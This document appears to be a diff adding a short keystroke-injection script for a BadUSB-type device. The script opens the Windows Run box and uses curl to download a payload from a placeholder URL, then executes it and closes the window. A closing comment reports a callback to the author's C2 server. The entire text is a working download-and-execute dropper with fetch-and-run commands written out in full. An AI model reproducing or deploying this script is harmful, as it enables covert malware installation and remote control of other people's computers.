@@ -1,0 +1,18 @@
+delay(10000);
+layout("US");
+typingSpeed("10000,0");
+press("GUI R");
+delay(500);
+type("cmd.exe /c curl -k <URL to payload) -o <drop path and filename.ext>\n");
+delay(1000);
+press("ENTER");
+delay(2500); //change according to the size of your payload, larger size will require a longer time for the download to complete
+press("GUI R");
+delay(500);
+type("cmd.exe /c <full path to payload.ext>\n");
+delay(1000);
+press("ENTER");
+press("ALT F4");
+\
+\
+*My payload was about 450kB in size, and it took around 1 min and 5 seconds for the complete execution of this script and get a callback on my c2 server*
